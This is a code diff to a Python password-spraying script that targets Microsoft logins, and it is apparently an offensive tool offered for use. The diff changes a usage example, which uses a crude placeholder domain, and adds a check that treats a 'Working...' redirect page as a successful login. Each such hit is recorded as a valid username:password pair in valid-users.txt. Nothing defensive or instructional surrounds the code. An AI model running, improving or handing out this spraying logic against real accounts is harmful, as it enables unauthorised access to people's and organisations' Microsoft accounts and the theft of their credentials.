@@ -22,7 +22,7 @@ parser = argparse.ArgumentParser(
     description=" Spray or test Microsoft login using username(s) and password(s).",
     epilog="Example usage:\n"
            "  python3 script.py -user users.txt -pass passwords.txt\n"
-           "  python3 script.py -user username@fuck.com -pass 'Aa123456'\n",
+           "  python3 script.py -user username@fuck.com -pass 'A'\n",
     formatter_class=argparse.RawTextHelpFormatter
 )
 
@@ -258,7 +258,14 @@ for username in usernames:
                 log_file.write(f"{username}:{password}\n")
             break
         else:
-            print(f"{RED}[✗] FAIL: {username} exists, but password is incorrect: {password}")
+            if "<html><head><title>Working...</title></head>" in response123.text:
+                print(f"{GREEN}[✓] SUCCESS: {username} logged in with password: {password}, with Redirect Page to..")
+                with open("valid-users.txt", "a") as log_file:
+                    log_file.write(f"{username}:{password}\n")
+                break
+            else:
+                print(f"{RED}[✗] FAIL: {username} exists, but password is incorrect: {password}")
+
             
 print(f"{RESET} seccess Logs written to valid-users.txt")
 
